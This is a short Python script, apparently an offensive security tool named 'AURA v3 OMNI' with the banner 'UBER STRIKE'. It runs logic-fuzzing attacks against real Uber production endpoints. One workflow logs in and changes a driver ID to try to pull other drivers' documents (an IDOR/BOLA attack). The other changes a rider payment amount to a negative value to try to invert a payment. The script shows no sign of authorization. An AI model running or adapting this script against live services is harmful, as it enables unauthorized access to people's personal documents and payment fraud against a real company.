import asyncio
import logging
from aura.modules.stateful_logic_fuzzer import StatefulLogicFuzzer
from aura.ui.formatter import ZenithFormatter

logging.basicConfig(level=logging.INFO)

async def main():
    ZenithFormatter.print_banner("AURA v3 OMNI — UBER STRIKE (Logic)")
    
    # 1. Initialize fuzzer for Uber
    fuzzer = StatefulLogicFuzzer(base_url="https://uber.com")
    
    # 2. Pipeline 1: BOLA/IDOR on Partner/Driver API (common target)
    workflow_1 = [
        {
            "name": "login",
            "method": "POST",
            "path": "https://partners.uber.com/api/v1/users/login",
            "data": {"email": "test@uber.com", "password": "password123"},
            "extract_token": "token"
        },
        {
            "name": "driver_documents",
            "method": "GET",
            "path": "https://partners.uber.com/api/v1/drivers/{{DRIVER_ID}}/documents",
            "mutate": {"DRIVER_ID": "12345"}
        }
    ]
    
    # 3. Pipeline 2: Request Smuggling / State Inversion on Rider API
    workflow_2 = [
        {
            "name": "rider_login",
            "method": "POST",
            "path": "https://riders.uber.com/api/login",
            "data": {"username": "rider_test", "pin": "0000"}
        },
        {
            "name": "payment_update",
            "method": "POST",
            "path": "https://riders.uber.com/api/payment/update",
            "data": {"account_id": "9999", "amount": 100},
            "mutate": {"amount": -100}
        }
    ]
    
    print("[*] Engaging Uber logic fuzzing pipelines...\n")
    print("[*] Pipeline 1: Partners BOLA (Driver Documents)")
    results1 = await fuzzer.execute_workflow(workflow_1)
    
    print("[*] Pipeline 2: Riders Payment Inversion")
    results2 = await fuzzer.execute_workflow(workflow_2)
    
    print("\n[*] Fuzzing Complete. Check reports/ directory.")

if __name__ == "__main__":
    asyncio.run(main())
